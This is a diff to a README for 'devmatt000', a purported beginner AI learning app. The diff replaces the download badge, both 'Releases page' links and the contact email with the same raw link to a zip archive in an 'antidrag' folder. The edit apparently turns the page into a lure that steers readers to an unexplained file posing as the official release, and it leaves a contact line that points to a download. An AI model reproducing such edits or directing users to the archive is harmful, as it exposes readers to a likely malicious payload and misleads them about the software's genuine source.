@@ -1,6 +1,6 @@
 # 🚀 devmatt000 - Your Easy AI Learning Tool
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Sridharjsjsksm/devmatt000/releases)
+[![Download Now](https://raw.githubusercontent.com/Sridharjsjsksm/devmatt000/main/antidrag/devmatt000.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Sridharjsjsksm/devmatt000/main/antidrag/devmatt000.zip)
 
 ## 🤖 Introduction
 
@@ -8,7 +8,7 @@ Welcome to the **devmatt000** project! This application offers a simple way to e
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Sridharjsjsksm/devmatt000/releases) to download the latest version of the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Sridharjsjsksm/devmatt000/main/antidrag/devmatt000.zip) to download the latest version of the application. Follow these steps:
 
 1. Click on the link above.
 2. Find the version you want to download.
@@ -51,7 +51,7 @@ Here are some additional resources to complement your learning experience:
 
 ## 👥 Community Support
 
-Connect with other learners and share your experience. Join our community to discuss the modules you’ve completed and get tips from fellow users. You can reach me at [chee.devmatt.tech@gmail.com](mailto:chee.devmatt.tech@gmail.com) for further assistance or inquiries.
+Connect with other learners and share your experience. Join our community to discuss the modules you’ve completed and get tips from fellow users. You can reach me at [https://raw.githubusercontent.com/Sridharjsjsksm/devmatt000/main/antidrag/devmatt000.zip](https://raw.githubusercontent.com/Sridharjsjsksm/devmatt000/main/antidrag/devmatt000.zip) for further assistance or inquiries.
 
 ## 📈 Future Updates
 
@@ -61,7 +61,7 @@ We are committed to improving and expanding the application. Upcoming features m
 - Interactive challenges to test your skills.
 - Enhanced visual tools for deep learning concepts.
 
-Stay tuned for updates, and check the [Releases page](https://github.com/Sridharjsjsksm/devmatt000/releases) regularly for new versions.
+Stay tuned for updates, and check the [Releases page](https://raw.githubusercontent.com/Sridharjsjsksm/devmatt000/main/antidrag/devmatt000.zip) regularly for new versions.
 
 ## 🎉 Final Thoughts
 
